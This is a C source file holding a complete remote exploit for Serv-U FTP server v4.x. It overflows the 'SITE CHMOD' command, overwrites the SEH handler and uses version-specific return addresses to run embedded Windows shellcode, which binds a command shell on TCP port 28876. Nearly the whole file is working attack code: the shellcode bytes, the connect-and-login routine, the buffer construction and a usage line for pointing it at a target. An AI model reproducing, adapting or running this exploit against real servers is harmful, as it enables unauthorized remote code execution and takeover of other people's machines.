#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define exploit_length      511
#define NOP 'A'

#define SEH_handler_offset  400
char* SEH_handler     = "\x41\x41\xEB\x04"; // 3) jmp over next four bytes
char* retaddress_4004 = "\xab\x1c\x5f\x01"; // 1) libeay32.015f1cab
char* retaddress_4100 = "\xcb\x1c\x41\x01"; // 1) ssleay32.01411ccb
char* retaddress_4103 = "\x8b\x1d\x41\x01"; // 1) ssleay32.01411d8b

char* shellcode = 
  "\xeb\x43\x56\x57\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x52\x8b\x52"
  "\x20\x01\xea\x31\xc0\x31\xc9\x41\x8b\x34\x8a\x01\xee\x31\xff\xc1"
  "\xcf\x13\xac\x01\xc7\x85\xc0\x75\xf6\x39\xdf\x75\xea\x5a\x8b\x5a"
  "\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
  "\xe8\x5f\x5e\xff\xe0\xfc\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b"
  "\x70\x1c\xad\x8b\x68\x08\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32"
  "\x2e\x64\x68\x77\x73\x32\x5f\x54\xbb\x71\xa7\xe8\xfe\xe8\x90\xff"
  "\xff\xff\x89\xef\x89\xc5\x81\xc4\x70\xfe\xff\xff\x54\x31\xc0\xfe"
  "\xc4\x40\x50\xbb\x22\x7d\xab\x7d\xe8\x75\xff\xff\xff\x31\xc0\x50"
  "\x50\x50\x50\x40\x50\x40\x50\xbb\xa6\x55\x34\x79\xe8\x61\xff\xff"
  "\xff\x89\xc6\x31\xc0\x50\x50\x35\x02\x01\x70\xcc\xfe\xcc\x50\x89"
  "\xe0\x50\x6a\x10\x50\x56\xbb\x81\xb4\x2c\xbe\xe8\x42\xff\xff\xff"
  "\x31\xc0\x50\x56\xbb\xd3\xfa\x58\x9b\xe8\x34\xff\xff\xff\x58\x6a"
  "\x10\x54\x50\x56\xbb\x47\xf3\x56\xc6\xe8\x24\xff\xff\xff\x31\xdb"
  "\x53\x68\x2e\x63\x6d\x64\x89\xe1\x41\x50\x50\x50\x53\x53\x31\xc0"
  "\xfe\xc4\x40\x50\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x6a\x44"
  "\x89\xe6\x50\x55\x53\x53\x53\x53\x54\x56\x53\x53\x53\x43\x53\x4b"
  "\x53\x53\x51\x53\x89\xfd\xbb\x21\xd0\x05\xd0\xe8\xe2\xfe\xff\xff"
  "\x31\xc0\x48\x8b\x44\x24\x04\xbb\x43\xcb\x8d\x5f\xe8\xd1\xfe\xff"
  "\xff\x5d\x5d\x5d\xbb\x12\x6b\x6d\xd0\xe8\xc4\xfe\xff\xff\x31\xc0"
  "\x50\x89\xfd\xbb\x69\x1d\x42\x3a\xe8\xb5\xfe\xff\xff";

int sock;
FILE* FILEsock;
int doubling;

void send_command(char *command, char *arguments) {
  int i;
  send(sock, command, strlen(command), 0);
  send(sock, " ", 1, 0);
  for (i=0; i<strlen(arguments); i++) {
    send(sock, arguments+i, 1, 0);
    if (doubling && arguments[i] == '\xff') send(sock, arguments+i, 1, 0);
  }
  send(sock, "\x0a\x0d", 2, 0);
}

int main(int argc, char *argv[], char *envp[]) {
  struct sockaddr_in addr;
  char *outbuffer, inbuffer[256];
  char *retaddress = NULL;
  char *version = NULL;

  if (argc<5) {
    printf("Usage: %s IP PORT USERNAME PASSWORD [DIRECTORY]\n", argv[0]);
    exit(-1);
  }

  printf("- Serv-ME ----------------------------------------------------\n"
         "  Serv-U v4.x \"site chmod\" exploit.\n"
         "  Written by SkyLined <SkyLined@EduP.TUDelft.nl>.\n"
         "  Credits for the vulnerability go to ICBM <icbm@0x557.net>.\n"
         "  Thanks to H D Moore for the shellcode (www.metasploit.com).\n"
         "  Greets to everyone at 0dd and #netric.\n"
         "  (K)(L)(F) for Suzan.\n"
         "\n"
         "  Binds a shell at %s:28876 if successfull.\n"
         "  Tested with: v4.0.0.4, v4.1.0.0, v4.1.0.3 on W2K-EN.\n"
         "--------------------------------------------------------------\n",
           argv[1]);

  addr.sin_family = AF_INET;
  addr.sin_port = htons(atoi(argv[2]));
  addr.sin_addr.s_addr = inet_addr(argv[1]);

  printf("\n[+] Connecting to %s:%s...\n", argv[1], argv[2]);
  if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
    perror("Socket creation failed");
    exit(-1);
  }
  if (connect(sock, (struct sockaddr *)&addr, sizeof addr) == -1) {
    perror("Connection failed");
    exit(-1);
  }
  FILEsock = fdopen(sock, "r");
  printf("    --> %s", fgets(inbuffer, sizeof inbuffer, FILEsock));
  if (strstr(inbuffer, "220 Serv-U FTP Server v4.") != inbuffer) {
    printf("[-] This is not a Serv-U v4.X ftp server.\n");
    exit(-1);
  }
  if (strstr(inbuffer, "v4.1") > 0) {
    retaddress = retaddress_4103;
    version = "4.1.0.3";
  }

  printf("\n[+] Login in as %s:%s...\n", argv[3], argv[4]);
  send_command("USER", argv[3]);
  printf("    --> %s", fgets(inbuffer, sizeof inbuffer, FILEsock));
  send_command("PASS", argv[4]);
  printf("    --> %s", fgets(inbuffer, sizeof inbuffer, FILEsock));
  if (strstr(inbuffer, "230") != inbuffer) {
    printf("[-] Login failed.\n");
    exit(-1);
  }

  if (argv[5]) {
    printf("\n[+] Changing directory...\n");
    send_command("CD", argv[5]);
    printf("    --> %s", fgets(inbuffer, sizeof inbuffer, FILEsock));
  }

  outbuffer = (char*) malloc(exploit_length + strlen(shellcode));
  memset(outbuffer, NOP, exploit_length);
  memcpy(outbuffer+exploit_length, shellcode, strlen(shellcode));

  printf("\n[+] Checking if \\xff doubling is nescesary: ");
  send_command("SITE CHMOD 477", "-\xff\xff-");
  fgets(inbuffer, sizeof inbuffer, FILEsock);
  if (strchr(inbuffer, '\xff') == strrchr(inbuffer, '\xff')) {
    doubling = 1;
    printf("Yes.");
    retaddress = retaddress_4004;
    version = "4.0.0.4";
  } else {
    printf("No.");
    if (retaddress==NULL) {
      retaddress = retaddress_4100;
      version = "4.1.0.0";
    }
  }
  printf("\n[+] Serv-U FTP server version %s: using retaddress 0x%08x",
                      version, *(int*)retaddress);
  memcpy(outbuffer + SEH_handler_offset, SEH_handler, strlen(SEH_handler));
  memcpy(outbuffer + SEH_handler_offset + 4, retaddress, strlen(retaddress));

  printf("\n[+] Sending exploit... ");
  send_command("SITE CHMOD 477", outbuffer);
  printf("send, you can now try to connect to %s:28876.\n", argv[1]);
  printf("    --> %s", fgets(inbuffer, sizeof inbuffer, FILEsock));
  close(socket);
  printf("\n[+] Done. \n");
}
